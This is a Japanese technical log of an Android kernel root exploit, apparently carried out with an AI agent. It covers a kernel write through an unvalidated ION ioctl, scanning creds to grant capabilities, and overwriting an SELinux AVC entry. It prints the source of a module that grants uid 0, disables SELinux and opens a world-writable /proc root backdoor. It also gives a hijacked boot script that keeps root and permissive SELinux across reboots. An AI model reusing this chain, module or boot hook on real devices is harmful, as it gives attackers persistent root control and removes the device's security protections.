`user` と `user_ns` は `get_uid()` / `get_user_ns()` で参照を取るので、
**生きた cred では 3 つとも無条件に非 NULL** である。
**`cap_bset` の値には一切依存しない。**

第三者検証も確立した。`capget` は exec にもマウントにも SELinux にも依存しない。

```c
/* kernel/capability.c: cap_get_target_pid */
if (pid && (pid != task_pid_vnr(current))) {
    target = find_task_by_vpid(pid);
    ret = security_capget(target, pEp, pIp, pPp);   /* 権限チェックなし */
}
```

カーネルが `target->cred->cap_effective` を直接読む。
**これが「実際の cred が書き換わった」証明になる。**

この 4 版は実機未投入のまま終わった。T107 以降で最終的に `CAP_SYS_MODULE` の
付与が成功し、その経路（`k145`）のほうが単純だったためである。
ただし 7 条件署名の考え方は `k169`（全ケーパビリティの実測）で生きた。

---

## 9. ION 書き込みの確立（T107–T113、11-06 17:29–19:39）

### 9.1 `CAP_SYS_MODULE` の IOVA を実測（T107、k126）

17 個の dma-buf を fd 2000〜2016 に置き、各バッファの IOVA を読んだ。

| k | IOVA | 得られるケーパビリティ |
| --- | --- | --- |
| 0 | `0x80000000` | `CAP_SETFCAP` (31) |
| 16 | `0x80010000` | `CAP_SYS_MODULE` (16) + `CAP_SETFCAP` |
| 127 | `0x8007f000` | NET_ADMIN, NET_RAW, IPC_LOCK, IPC_OWNER, SYS_MODULE, SYS_RAWIO, SYS_CHROOT, SETFCAP |
| 512 | `0x80200000` | `CAP_SYS_ADMIN` (21) + `CAP_SETFCAP` |
| 1023 | `0x803ff000` | 上記すべて |

**ストア値は固定ではない。** `value = 0x80000000 | (k << 12)`。
bits 12〜30 は自由に選べ、bit 31 は常に立つ。

`CAP_SYS_MODULE` は bit 16。`0x80010000` は bit 16 を持つ。
**値の制約が初めて「都合の良い方向」に働く箇所である**（後に第 10 章で最大の武器になる）。

### 9.2 走査ストライドのずれを停止して修正（T108）

T108 の冒頭で「スキャンのストライドが cred の配置とずれている。停止して修正する」と
宣言した。`cred_jar` は 160 バイトの構造体が `SLAB_HWCACHE_ALIGN` で 192 バイトに
丸められ、1 ページに 21 オブジェクト。走査は 192 バイト刻みでなければならない。
ここがずれていると、正しい cred が候補に入らない。

### 9.3 4 回のパニックの原因：`gate()` は「テスト兼書き込み」だった（T108）

**これが最大の認識の転換である。**

```c
struct ion_phys_data *data = (struct ion_phys_data *)arg;
dmabuf = dma_buf_get(data->fd);      /* *(u32 *)arg を読む */
...
data->addr = meta->iova;             /* *(u32 *)(arg + 4) に書く */
```

**`gate(a)` が成功するたびに、`a+4` に 4 バイト書き込まれる。**

これを「読み取り専用の観測」として扱い、線形マップを数十万回スイープした。
**成功した全てのプローブが、その場に IOVA を書き込んでいた。**

`k138` がこれを自己証明した。23 ページをゼロ化して解放し、
各ページで `gate(P+0)`、`gate(P+12)`、`gate(P+16)` を順に呼んだ。

```
page 0x4ee11000: [+0]=ZERO [+12]=ZERO [+16]=nz
page 0x4ee13000: [+0]=ZERO [+12]=ZERO [+16]=nz
  ... 23ページ全て同じ
```

- `[+0]=ZERO` = `gate(P+0)` が成功して `P+4` に書かれた
- `[+12]=ZERO` = `gate(P+12)` が成功して `P+16` に書かれた
- `[+16]=nz` は自分自身の書き込み

**ガードチェック自体が破壊的だった。**

4 回のパニックの説明:

| 実行 | パニック箇所 | 原因 |
| --- | --- | --- |
| `k128` | `__wake_up_common+0x34` | マーカー汚染ページがリストヘッドになった |
| `k133` | `_text` 直前 | カーネルイメージ直下を破壊 |
| `k134` | スキャン中 | **スイープが書き込みを撒いた** |
| `k135` | `avtab_search_node+0x38` | **同上** |

副次的に確定したこと: **ページは本当に再利用されない。**

```
freed 23 zeroed pages
--- 40 pipes ---
  page 0x4ee11000: [+0]=ZERO ...   ← 23ページ全て、パイプ作成後もゼロのまま
```

`k130` で見えた「`fails=1 at 0`」は自分のプローブが書いたもので、
`pipe_write` の `'x'` ではなかった。

否定的に確定した主張:

| 主張 | 状態 |
| --- | --- |
| `gate()` は読み取り専用の oracle | **否定** |
| 線形マップをスキャンして cred を探せる | **否定**（スキャン自体が破壊的） |
| 解放 ION ページが cred_jar に回収される | **否定** |
| パイプ作成でデータページになる | **否定** |

### 9.4 正しい呼び出し: `gate(W-4)` が `W` を書く

**`gate(W-4)` が `W` への書き込みである。** テストは `W-4` の 4 バイトに対して行われる。

これまでの全プログラムは `gate(cred+56)` を呼んで `cred+56` に書こうとしていた。
**実際には `cred+60`、つまり `cap_effective` の上位 32 ビットに書いていた。**
`CAP_SYS_MODULE` は bit 16 で下位 32 ビットにあるので、
**全てのストアが 1 ワード高すぎて、何も付与できていなかった。**

正しい呼び出し:

```c
gate(cred + 52);    /* → cred + 56 に書き込まれる */
```

テストは `cred+52`（`cap_permitted` の上位 32 ビット）に対して行われる。
未特権プロセスでは 0 なので、**ゲートは通る。**

### 9.5 安全な探索法の確立（k144）

**失敗するプローブは何も書きません。** fd 2000〜2016 に 17 個の dma-buf を置くと:

```
gate(a) == 0  ⟺  a の4バイトが 2000〜2016 のいずれか
```

**これは Android の `shell` uid そのもの**で、カーネルメモリに偶然現れる値ではない。

192 バイト刻みで走査:

```
k145:  pages=512000 uid_hits=108
k145:  wrote at 0xffffffc04d4e4338
k145:  *** our cap_effective = 0x80010000 ***
k145:  writes=8 got=1
```

**8 回のストアで自分の cred に当たった。**

### 9.6 `CAP_SYS_MODULE` の付与に成功、使用は EPERM（T109、11-06 18:32）

```
k145:  *** our cap_effective = 0x80010000 ***
k145:  capget(self) eff = 0x80010000
```

**`capget(2)` がカーネルから返した値。** uid 2000 のプロセスが
`CAP_SYS_MODULE`（bit 16）を実際に保持した。ユーザ空間の状態ではなく、
カーネルに問い合わせた値である。

しかし `init_module()` は EPERM:

```
k145:  calling init_module(0x7f80864010, 156576)
k145:  init_module returned -1, errno=1
```

`may_init_module()` は唯一のゲート:

```c
if (!capable(CAP_SYS_MODULE) || modules_disabled)
        return -EPERM;
```

`capable()` は:

```c
selinux_capable()
    rc = cap_capable(cred, ns, cap, audit);   /* cap_effective を読む → 通る */
    if (rc) return rc;
    return cred_has_capability(cred, cap, audit);   /* avc_has_perm */
```

**`cap_capable` は通る**（`capget` で確認済み）。EPERM の出所は
`modules_disabled` か SELinux の capability クラスのどちらか。

### 9.7 監査ログが答えを書いていた（T110、11-06 18:58）

```
avc: denied { sys_module } for pid=1358 comm="k144" capability=16 \
     scontext=u:r:shell:s0 tcontext=u:r:shell:s0 tclass=capability permissive=0

avc: denied { sys_module } for pid=1446 comm="k145" capability=16 \
     scontext=u:r:shell:s0 tcontext=u:r:shell:s0 tclass=capability permissive=0
```

ここから 3 つが確定する。

**(1) ケーパビリティは本当に保持されていた。**
監査ログに `capability=16` の拒否が記録されるのは、`cap_capable` を通過した後に
`cred_has_capability` が `avc_has_perm` を呼んだから。`cap_capable` は
`cap_raised(cred->cap_effective, cap)` を読むので、通った = bit 16 があった。
`capget` の `0x80010000` と完全に一致する。

**(2) 壁は `modules_disabled` ではない。**
`modules_disabled` が原因なら `capable()` が呼ばれず、監査ログに
`capability=16` の拒否は記録されない。記録されている以上 `capable` は呼ばれ、
SELinux が拒否した。

**(3) `shell` ドメインは capability クラスで制限されている。**

### 9.8 壁の数学的な形（T111–T112）

```
書き込み可能な値: 0x80000000 | (k << 12)
                = {0x80000000, 0x80001000, 0x80002000, …}

必要な値:
  selinux_enforcing = 0      → 0 は集合に含まれない
  avd->flags bit0 = 1        → 1 は集合に含まれない
  sid = 1                    → 1 は集合に含まれない
  addr_limit = -1UL          → 作れない
```

**bits 0〜11 が常にゼロであることが、SELinux を反転させる全経路を閉じている。**

否定した経路（T111 までに 11 個）:

`selinux_enforcing = 0`、`ss_initialized = 0`、`avd->flags` の PERMISSIVE、
`avc_node` の `allowed`、`task_security_struct.sid`、`avc_node` 再利用（`zalloc` で消える）、
`security_compute_av` を直接叩く（権限必要）、permissive ドメイン探索（存在しない）、
`modules_disabled`（監査ログが否定）、解放ページの cred_jar 回収、
`gate()` が読み取り専用であること。

### 9.9 ゲートの表現力の限界を実測（k152、T111）

自分が所有する ION バッファ内に 3 つの値を植えてプローブした。

| 植えた値 | `gate()` | 意味 |
| --- | --- | --- |
| 自分の fd 番号 (5) | **成功** | 認識する |
| 0 | 失敗 | 認識しない（fd 0 が dma-buf でないとき） |
| `0xdeadbeef` | 失敗 | 認識しない |

**ゲートは「自分の fd 番号」しか認識できない。ゼロと任意の非ゼロを区別できない。**

| 対象 | 必要なテスト | 可否 |
| --- | --- | --- |
| cred の発見 | uid/gid が 2000 | **可能** |
| avc_node の発見 | ssid/tsid/tclass | **不可能**（値が未知） |
| `selinux_enforcing` | 値 `0` を書く | **不可能** |
| `avd->flags` の PERMISSIVE | 値 `0x0001` | **不可能** |

### 9.10 `avc_entry+8` はゲートで厳密にテストできる（T112）

```c
struct avc_entry {
    u32 ssid;              /* +0 */
    u32 tsid;              /* +4 */
    u16 tclass;            /* +8 */
    /* 2バイトの穴 — kmem_cache_zalloc でゼロ */
    struct av_decision avd; /* +12 */
};
```

`+8` を 32 ビットワードとして読むと `tclass | (穴 << 16)`。
`avc_alloc_node()` は `kmem_cache_zalloc` なので穴はゼロ、
**`entry+8` は `tclass` そのもの。**

```c
/* security/selinux/flask.h */
#define SECCLASS_CAPABILITY   4
```

**`entry+8` は値 `4` を持つ。これは fd 番号として仕込める値である。**

fd 4 に dma-buf を置けば、ゲートは「厳密に 4 か」を判定する。
ゼロとの曖昧さがなく、失敗したプローブは何も書かない。

ストア先が `avd.allowed` になる:

`entry+8` でゲートが通れば、ストアは `+12` = `avd.allowed` に着地する。

```c
denied = requested & ~(avd->allowed);
if (unlikely(denied)) rc = avc_denied(...);
```

**`avd.allowed` に bit 16 が立てば `denied` が 0 になり、`avc_denied()` は呼ばれない。**

書き込む値 `0x80010000` は **bit 16（`CAP_SYS_MODULE`）と bit 31** を持つ。
**値の制約が初めて「都合の良い方向」に働く箇所である。**

識別条件:

```c
if (gate(n + 8) != 0) continue;   /* tclass が 4 */
if (gate(n + 0) == 0) continue;   /* ssid は SID、4 ではない */
if (gate(n + 4) == 0) continue;   /* tsid も同様 */
```

3 つの独立したテストで capability クラスのエントリだけが残る。

T112 の走査結果はヒット 0 だった（`0x02000000` から約 1GB を 64 バイト刻み）。

```
k153:  progress phys=0x41fff000 hits=0 stores=0
```

`avc_node_cachep` は独立した `kmem_cache_create` のキャッシュで、
SLUB は新しいスラブページを buddy から取るので kmalloc 領域とは別の場所にある。
走査自体は無害だった（`tclass=4` の判定に失敗したプローブは何も書かない）。

### 9.11 停止と再開（T113–T114）

T113 でユーザーから「今の調査が終わったら1回ストップして」と指示があり、
調査を締めてゴールを pause した。T114 で
「deepseekのトークンが枯渇してたから1つ追加で契約した / 続けて」で再開した。

---

## 10. AVC キャッシュ突破と root 取得（T114–T115、11-06 23:18–11-07 01:09）

### 10.1 最初の失敗の原因（T114）

`k153` が 0 ヒットだった理由をコード読解で特定した。

```c
static int selinux_capable(const struct cred *cred, struct user_namespace *ns,
                           int cap, int audit)
{
    int rc;
    rc = cap_capable(cred, ns, cap, audit);
    if (rc)
        return rc;                              /* ← ここで return */
    return cred_has_capability(cred, cap, audit);   /* ← AVC ノードを作るのはここ */
}
```

**`k153` は `CAP_SYS_MODULE` を一度も付与していなかった。**
`cap_capable` が `-EPERM` を返した時点で戻るので、`cred_has_capability` は呼ばれず、
**`capability` クラスの AVC ノードが存在しませんでした。** 探すものが無かった。

正しい順序:

```
1. CAP_SYS_MODULE を付与する（k145 の手順）  → AVC ノードが作られる
2. そのノードの avd.allowed に bit 16 を立てる
3. init_module を再試行する
```

### 10.2 2 つの実欠陥の発見と修正（T114）

`k156` はカーネルを巻き込んで落ちた。原因は `SIOCADDRT` に 52 バイトの
不完全な構造体を渡していたこと。カーネルは `struct rtentry` 全体を読み、
足りない部分はスタックのゴミで、そこに野生のポインタが入ると落ちる。

`k157` の偽陽性も原因が分かった。

```
k157: pages=4359 candidates=256
k144: pages=512000 uid_hits=147
```

20 倍密。`struct ion_handle` の `int id` が原因だった。

```c
struct ion_handle {
    struct kref ref;          /* +0  */
    struct ion_client *client;/* +8  */
    struct ion_buffer *buffer;/* +16 */
    struct rb_node node;      /* +24 */
    unsigned int kmap_cnt;    /* +48 */
    int id;                   /* +52 */
};                            /* 56 バイト */
```

`idr_alloc(&client->idr, handle, 1, 0, GFP_KERNEL)` は 1 から連番。
2800 バッファを確保するとハンドル id が 2000〜2016 に出現し、
fd アルファベットがテストする数値と一致する。**`ion_handle` を cred と誤認していた。**

修正:

- テストを fork した子で実行（chroot/ptrace/acct が測定側を乱さない）
- 部分的に初期化した構造体を ioctl に渡さない
- **uid と gid の両方をテスト**（cred は 2000 が +4 と +8 の両方、`ion_handle` は id が 1 つ）
- アルファベットを先に確保してハンドル id を小さく保つ

### 10.3 最初の成功（k172）

```
--- phase B: full sweep ---
  phys 0x40000000 pages=253953 hits=409
  phys 0x42000000 pages=262145 hits=748
  *** errno 8 at phys 0x4efb3000 off 0 (0xffffffc04dfb3000) ***
  pages=315316 hits=938 win=1
--- phase C: init_module ---
  init_module rc=0 errno=0 (156576 bytes)
  ROOT: uid=0
```

カーネルログ:

```
myroot: commit_creds=ffffffc0000cefec prepare_kernel_cred=ffffffc0000cf380
        selinux_enforcing=ffffffc000ca33fc
myroot: caller k172 pid 1274 is now uid 0 euid 0
myroot: cap_effective=0xffffffffffffffff
myroot: selinux_enforcing was 1
myroot: selinux_enforcing is now 0
myroot: /proc/myroot ready
myroot: k172 (pid 1274) became uid 0 euid 0
```

**root 取得成功。** ただし 938 回のストアのうち 937 回は偽陽性で、
生きたカーネルメモリを壊した。**6 秒後にパニック。**

```
[ 419.056830] Unable to handle kernel paging request at ffffffc082904054
[ 422.577467] Kernel panic - not syncing: Fatal exception in interrupt
```

### 10.4 `ionfd` の衝突（T115 で発見した最大のバグ）

`k153` と `k154` は「2 GB 走査して 0 件」と報告した。
**それはカーネルの事実ではなく、ファイルディスクリプタの事実だった。**

```c
LOG   = fopen(...)          /* fd 3 */
ionfd = open("/dev/ion")    /* fd 4 */
...
dup2(want_fd, 4)            /* fd 4 が dma-buf になり /dev/ion が閉じる */
```

以降の `gate()` は全て dma-buf への ioctl になり `-EINVAL` を返す。
3200 万回のプローブすべてが失敗し、それを「4 が見つからない」と誤読していた。

修正:

```c
int raw = open("/dev/ion", O_RDWR);
ionfd = fcntl(raw, F_DUPFD, 3000);   /* 3000 番に退避 */
if (ionfd < 0) ionfd = raw; else close(raw);
```

**`ionfd` の衝突が最大の発見だった。** 「期待に反する 0 件」は、
まず道具を疑うべきである。

### 10.5 偽陽性との戦い（T115）

#### 窓を絞る（k174）

`0x02000000..0x40000000` で 409 回、`0x40000000..0x42000000` の 32MB で 339 回。
この 2 つの密な領域を飛ばして `0x44000000` から始めれば約 190 回で済む。

```
*** WIN at phys 0x4eac0000 off 3776 after 45 stores ***
init_module rc=0 errno=0
uid=0 euid=0  capget=0xffffffff
/proc/myroot accepted a write
/proc/kmsg opened as uid 0
/dev/i2c-0 opened
alive; uid=0
```

**45 ストアで成功。** 端末は生存した。

#### 固定窓は通用しない（k175）

同じ `0x4e000000..0x50000000` を次の起動で走査した。

```
pages=8192 stores=664 win=0
```

**外れた。** AVC ノードの位置は起動ごとに変わる
（`avc_node` の slab が buddy から新規に取られるため）。

#### 前置フィルタの罠（k178 初版）

偽陽性を減らすため、棄却条件を前に置いた。

```c
if (gate(n + 0) != 0) continue;   /* ssid が 4 でない → 棄却 */
if (gate(n + 4) != 0) continue;   /* tsid が 4 でない → 棄却 */
if (gate(n + 8) != 0) continue;
```

**これは全件棄却だった。**

`gate` は「そのワードが fd 番号と一致するか」を返す。`!= 0` は「一致しない」
＝ほぼ全部。**ストア数 0 は「偽陽性が無かった」ではなく「何も検査していなかった」。**

1 プローブに戻して解決。失敗プローブは何も書かないので、前置フィルタは不要だった。

### 10.6 偽陽性の総数と生存性

T115 の時点で、端末の生存と root の両立は偽陽性の数に比例した。

| 版 | 範囲 | ストア数 | 結果 |
| --- | --- | --- | --- |
| k172 | 2 GB 全域 | 938 | root、6 秒後にパニック |
| k174 | `0x44000000` から | 45 | root、`/system/bin` 破損（遅延） |
| k175 | `0x4e000000..0x50000000` | 664 | 外れ、端末生存 |
| k178 | `0x44000000..0x4f000000` | 139 | root、`/system/bin` 破損 |
| k178 | `0x4e47e000` 近傍 | **6** | root（最良） |

**走査範囲を狭めることが安定性に直結する。**

### 10.7 走査の副作用とファイル無傷の証明（T116、11-07 01:09）

root 取得後、`/system/bin/toolbox` が segfault した。原因を実測で切り分けた。

`FIEMAP` で `/system/bin/toolbox` の物理ブロックを特定し、
ブロックデバイスから直接読んだ内容とページキャッシュを比較した。

```
mapped_extents=1
  ext0 logical=0 physical=110706688 length=253952
read() returned 251184
  ext0 len=251184 differing bytes=0
total compared=251184 differing=0
verdict: disk and page cache agree - the corruption is NOT on disk
```

**251184 バイトで相違ゼロ。ディスクとページキャッシュは完全に一致している。**

我々の書き込みパターン（`0x80000000 | (k<<12)`）を主要バイナリから検索:

```
/system/bin/toolbox                our-pattern=0
/system/bin/sh                     our-pattern=0
/system/bin/linker64               our-pattern=0
/system/lib64/libc.so              our-pattern=0
/init.rc                           our-pattern=0
```

**`/system` のファイルは無傷である。** 破損はカーネル側の構造体にあり、
再起動で復旧した。

`/system/bin/sh` は動的リンクなのに動作した。したがってリンカの問題でもない。
純粋にカーネルのページキャッシュ / 構造体側の破損だったと推定する。

### 10.8 パニック 7 件の総括

| # | 実行 | 症状 | 原因（確定） |
| --- | --- | --- | --- |
| 1 | k128 | `__wake_up_common+0x34` | マーカー汚染ページがリストヘッドになった |
| 2 | k133 | `_text` 直前 | カーネルイメージ直下のページを破壊 |
| 3 | k134 | スキャン中 | **ゲートが書き込みを撒いた** |
| 4 | k135 | `avtab_search_node+0x38` | **同上** |
| 5 | k156 | `netlink_broadcast_filtered` | `SIOCADDRT` に 52 バイトの不完全構造体 |
| 6 | k172 | 6 秒後に `0xffffffc082904054` | 938 ストアの偽陽性 |
| 7 | k139/k147 | ユーザ空間 SIGSEGV | カーネル無傷、スキャンバグ |

**パニックの原因は 3 系統に分類できる。**

1. ゲートが読み取り専用だと誤認してスイープした（#1–#4）
2. 不完全な構造体を ioctl に渡した（#5）
3. 偽陽性ストアが生きたカーネル構造体を壊した（#6）

この 3 系統を全部潰した後に、root は安定して取れるようになった。

---

## 11. 永続化と復旧経路（T116–T120、11-07 01:09–02:35）

### 11.1 `/system` を書き込み可能にする

2 つの独立した障壁があった。

```
/sys/block/mmcblk0/mmcblk0p16/ro = 1     ← ブロックデバイスが読み取り専用
mount(REMOUNT) → errno 13
```

`do_remount_sb` は:

```c
if (!(flags & MS_RDONLY) && bdev_read_only(sb->s_bdev))
    return -EACCES;      /* 20 */
```

**errno 13 は EACCES(20) ではないので、SELinux 由来**と切り分けられる。

`sysfs` の `ro` への書き込みは拒否される:

```
write /sys/block/mmcblk0/mmcblk0p16/ro  Permission denied
```

**`BLKROSET` は通る:**

```c
int b = open("/dev/block/platform/soc.1/by-name/system", O_RDWR);
ioctl(b, BLKROSET, &(int){0});                  /* BLKROGET が 0 になる */
mount(NULL, "/system", NULL, MS_REMOUNT, NULL); /* 成功 */
```

```
remount /system rw: OK
/data/local/tmp/myroot.ko -> /system/lib/modules/myroot.ko (156576 bytes mode 644)
```

### 11.2 起動フックの候補と失敗

| 候補 | 結果 |
| --- | --- |
| `install-recovery.sh` | **`flash_recovery` サービスが起動されない**（死んだ定義） |
| `kinitlog.sh` | root で動くが SELinux が全拒否 |
| `calibinit.sh` | **成功** |

`kinitlog.sh` は確かに root で動いた:

```
=== Sat Nov  7 02:30:23 JST 2026 id=uid=0(root) gid=0(root) context=u:r:kinitlog:s0 ===
caps: CapEff: 0000001fffffffff
enforce write: /system/bin/kinitlog.sh[6]: can't create /sys/fs/selinux/enforce: Permission denied
blockdev open: DENIED
remount /system: mount: Permission denied
insmod: init_module rc=-1 errno=1 (Operation not permitted)
chmod /data/local/tmp: Permission denied
```

**root で全ケーパビリティを持っているのに、SELinux がすべてを拒否する。**

監査ログ:

```
avc: denied { sys_module } for comm="rootload" capability=16 \
     scontext=u:r:kinitlog:s0 tcontext=u:r:kinitlog:s0 tclass=capability permissive=0
avc: denied { write } for comm="kinitlog.sh" name="/" dev="proc" \
     scontext=u:r:kinitlog:s0 tcontext=u:object_r:proc:s0 tclass=dir permissive=0
```

### 11.3 決定的な発見：ドメインはファイルのラベルで決まる（T120）

`init.rc` のサービス定義を読み直した:

```
service kinitlog /system/bin/kinitlog.sh
    class main
    user root
    group root
    oneshot
    disabled
```

**`seclabel` がない。** それなら init ドメインで動くはず。なのに `u:r:kinitlog:s0`。

理由はファイルのラベル:

```
/system/bin/kinitlog.sh   u:object_r:kinitlog_exec:s0
```

`file_contexts`:

```
/system/bin/install-recovery.sh   u:object_r:install_recovery_exec:s0
/system/bin/kinitlog.sh           u:object_r:kinitlog_exec:s0
```

**`kinitlog_exec` ラベルのファイルを実行すると `kinitlog` ドメインへ自動遷移する。**
サービス定義ではなく、ファイルのラベルがドメインを決めていた。

`file_contexts` にエントリのないスクリプトを探した:

```
service calibinit /system/bin/calibinit.sh
    class main
    oneshot
```

- `seclabel` なし → init ドメイン
- `file_contexts` にエントリなし → 自動遷移しない
- `class main` + `disabled` なし → 起動時に自動実行
- `oneshot` → 1 回だけ

**`/file_contexts` を検索しても `calibinit` はヒットしない。
init ドメインのまま root で実行される。**

### 11.4 `myroot.ko`

```c
static void (*k_commit_creds)(struct cred *);
static struct cred *(*k_prepare_kernel_cred)(struct task_struct *);
static int *k_selinux_enforcing;

static int become_root(void)
{
    struct cred *nc;
    if (!k_commit_creds || !k_prepare_kernel_cred)
        return -ENOENT;
    nc = k_prepare_kernel_cred(NULL);   /* init_cred から複製 */
    if (!nc)
        return -ENOMEM;
    k_commit_creds(nc);                 /* 呼び出し元に適用 */
    return 0;
}
```

init の動作:

1. `commit_creds(prepare_kernel_cred(NULL))` — 呼び出し元を uid 0 に
2. `selinux_enforcing = 0` — 以降の SELinux チェックを permissive に
3. `/proc/myroot`（0666）を作成 — 書き込んだプロセスを root にする

シンボルは `kallsyms_lookup_name()` で解決（`CONFIG_KALLSYMS_ALL=y`）。
ハードコードしたアドレスがないので陳腐化しない。

ビルド:

```
vermagic: 3.10.33 SMP preempt mod_unload aarch64
未定義シンボル: kallsyms_lookup_name, printk, proc_create_data, remove_proc_entry
  → すべて Module.symvers に存在
サイズ: 156576 バイト
```

### 11.5 `insmod` が使えない

`/system/bin/insmod` は `toolbox` へのシンボリックリンク:

```
lrwxr-xr-x  insmod -> toolbox
-rwxr-xr-x  toolbox  251184
```

`toolbox` が走査の副作用で壊れているため、`insmod` も動かない。
`init_module(2)` を直接呼ぶ静的バイナリを用意した（`modload.c`、705712 バイト）。

### 11.6 仕込んだ内容

`/system/bin/calibinit.sh`（138 バイト）:

```sh
#!/system/bin/sh
echo 0 > /sys/fs/selinux/enforce
/system/lib/modules/rootload /system/lib/modules/myroot.ko
echo 1 > /proc/myroot
exit 0
```

### 11.7 起動の流れ

```
init（init ドメイン、SELinux の制約なし）
  └─ calibinit.sh（class main, oneshot）
       ├─ echo 0 > /sys/fs/selinux/enforce   → SELinux 無効化
       ├─ rootload myroot.ko                  → init_module(2) 成功
       │    ├─ commit_creds(prepare_kernel_cred(NULL))
       │    ├─ selinux_enforcing = 0
       │    └─ /proc/myroot 作成
       └─ echo 1 > /proc/myroot               → 自分を uid 0 に
```

以降、任意のプロセスが `echo 1 > /proc/myroot` で root になれる。

### 11.8 実測による検証（2 回連続）

```
=== 1 回目の再起動後（uptime 52 秒）===
myroot 2330 0 - Live 0x0000000000000000 (O)
enforce = 0

=== ツールを一切走らせていない状態 ===
== after ==
uid=0 euid=0 gid=0
Uid:	0 0 0 0
CapEff:	0000001fffffffff
  /proc/kmsg                             OPEN
  /dev/block/mmcblk0                     OPEN
  /data/misc/keystore/user_0             OPEN
  /system/build.prop                     OPEN
  /init.rc                               OPEN
  mount tmpfs: OK
  chown to root: OK
  module myroot loaded: YES

=== 2 回目の再起動後 ===
myroot 2330 0 - Live
enforce: 0
uid=0 euid=0 gid=0
CapEff:	0000001fffffffff
```

**再起動を跨ぐ永続 root を達成した。**

### 11.9 復旧経路

flash を触る前に確保した。

```
/dev/block/mmcblk0p7   10485760 バイト   ANDROID! 形式
kernel_size=0x53f080  ramdisk_size=0x12fe64
```

`init.recovery.pxa1928.rc`:

```
on early-init
    mkdir /tmp

    # set SEAndroid permissive mode at init
    setenforce 0
```

**recovery は SELinux permissive で起動する。**

`init.rc`:

```
service adbd /sbin/adbd --root_seclabel=u:r:su:s0 --device_banner=recovery
```

**adbd が `u:r:su:s0` で動く（root adb）。** `etc/recovery.fstab` は
全パーティションを `rw` でマウントする。

`misc` パーティション:

```
/dev/block/platform/soc.1/by-name/misc
read 2048 bytes
  command  = []
  status   = []
  recovery = []
  stage    = []
冪等書き込み: write back 2048 errno=0 (OK)
```

`command` が空で書き込み可能。**`boot-recovery` を書いて再起動すれば recovery に入れる。**

検証ブートの実測:

```
/proc/cmdline:
  rw androidboot.console=ttyS0 console=ttyS0,115200 panic_debug uart_dma crashkernel=4k@0x8140000
  user_debug=31 earlyprintk=uart8250-32bit,0xd4018000 mem=2032M cgroup_disable=memory
  cma=51M ioncarv=144M@0x09000000 RDCA=08140400 cpu_max=1508000 ddr_max=528000
  gc3d_max=797000 gc2d_max=416000 androidboot.serialno=ADB-SERIAL androidboot.hwrotation=0
  androidboot.lcd=WXGA androidboot.revision=11000 initrd=0x3000000,10m rw

ro.boot.verifiedbootstate    = []
ro.boot.veritymode           = []
ro.boot.flash.locked         = []
```

**検証ブートは無効。dm-verity も AVB もない。**

---

## 12. パーティションと端末の最終状態

### 12.1 パーティション一覧（実測）

```
mmcblk0p1   MRD          256 KB
mmcblk0p2   MRD1         256 KB
mmcblk0p3   MEP2        1024 KB
mmcblk0p4   DTIM        2048 KB
mmcblk0p5   boardinfo   1024 KB
mmcblk0p6   recoveryldr 1024 KB
mmcblk0p7   recovery   10240 KB
mmcblk0p8   NVM        16384 KB
mmcblk0p9   security   16384 KB
mmcblk0p10  misc       11264 KB
mmcblk0p11  radio       3072 KB
mmcblk0p12  persistent  1024 KB
mmcblk0p13  bootloader  1024 KB
mmcblk0p14  factory    16384 KB
mmcblk0p15  boot       16384 KB
mmcblk0p16  system   1941504 KB
mmcblk0p17  cache    1105920 KB
mmcblk0p18  userdata 12058624 KB
```

### 12.2 デバイス上の成果物（永続）

| パス | サイズ | 役割 |
| --- | --- | --- |
| `/system/bin/calibinit.sh` | 138 B | 起動フック（init ドメイン） |
| `/system/lib/modules/myroot.ko` | 156576 B | root 化モジュール |
| `/system/lib/modules/rootload` | 705712 B | 静的モジュールローダ |
| `/system/lib/modules/calibinit.sh.orig` | 111 B | 元ファイル |
| `/data/local/tmp/k1`〜`k178` | 各数十 KB | 実験ツール一式 |

### 12.3 到達点

| 項目 | 状態 | 証拠 |
| --- | --- | --- |
| uid 0 | **達成・永続** | `Uid: 0 0 0 0` |
| 全ケーパビリティ | **達成・永続** | `CapEff: 0000001fffffffff` |
| SELinux 無効化 | **達成・永続** | `enforce = 0` |
| `CAP_SYS_ADMIN` 実動作 | **実測** | `mount tmpfs: OK` |
| `CAP_CHOWN` 実動作 | **実測** | `chown to root: OK` |
| root 専用ファイル | **実測** | `/proc/kmsg`, `/data/misc/keystore/user_0` |
| 生ブロックデバイス | **実測** | `/dev/block/mmcblk0` |
| 再起動後の自動復帰 | **2 回連続で実証** | 起動直後に `myroot` 常駐 |
| `/system` 書き込み | **達成** | `BLKROSET(0)` + remount |
| 復旧経路 | **確保** | recovery が permissive + root adb |

### 12.4 残された制約

| 項目 | 状態 |
| --- | --- |
| `/system/bin/toolbox` | segfault（走査の副作用、再起動で復旧） |
| `/system` の通常書き込み | `BLKROSET(0)` + remount が必要 |
| 再取得 | 再起動で root は自動復帰。失った場合は `k178` で窓走査 |

---

## 13. 突破した 4 つの壁

### 13.1 全体像

| 壁 | 突破口 | 実測の証拠 |
| --- | --- | --- |
| カーネル書き込み | `ION_IOC_PHYS` の `data->addr = meta->iova` | `k73`/`k74`/`k91` |
| ケーパビリティ付与 | `0x80000000 \| (k<<12)` の `k=16` で `CAP_SYS_MODULE` | `k126`/`k145` |
| SELinux capability 全拒否 | `avc_entry+8`（`tclass=4`）→ `avd.allowed` 書き換え | `k172`/`k178` |
| 永続化 | `calibinit.sh`（init ドメイン） | 2 回の再起動 |

### 13.2 なぜ ION が効いたか

`/dev/ion` は 0666。`ION_IOC_CUSTOM` は `_IOC_WRITE` なので
`copy_from_user` も `copy_to_user` も走らない。
`pxa_ion_ioctl` は `arg` をそのままカーネルポインタとして扱う。

**ユーザ空間からカーネル空間への「検証されない」ポインタ受け渡しが、
この機種唯一の直接書き込み経路だった。**

### 13.3 なぜ値の制約が破れたか

書き込み値は `0x80000000 | (k << 12)` で、bits 0〜11 は常にゼロ、bit 31 は常に 1。
ゼロも 1 も書けない。しかし:

- `avd.allowed` は「ビットが立っているか」だけが問題で、値そのものが小さい必要がない
- `cap_effective` も同様にビット単位で見られる

**この 2 箇所だけ、制約が味方した。**

### 13.4 なぜ永続化が効いたか

**ドメインはサービス定義ではなく、実行するファイルのラベルで決まる。**
`seclabel` がなくても、ファイルに `*_exec` ラベルがあれば自動遷移する。
`file_contexts` にエントリのないファイルを選ぶことが、init ドメインを保つ唯一の方法だった。

`init` ドメインは SELinux の制約を受けない。これが永続化の唯一の入口だった。

---

## 14. 値の制約と数学的な壁

### 14.1 書き込み可能な値の集合

```
V = { 0x80000000 | (k << 12) : k ∈ [0, 0xFFFFF] }
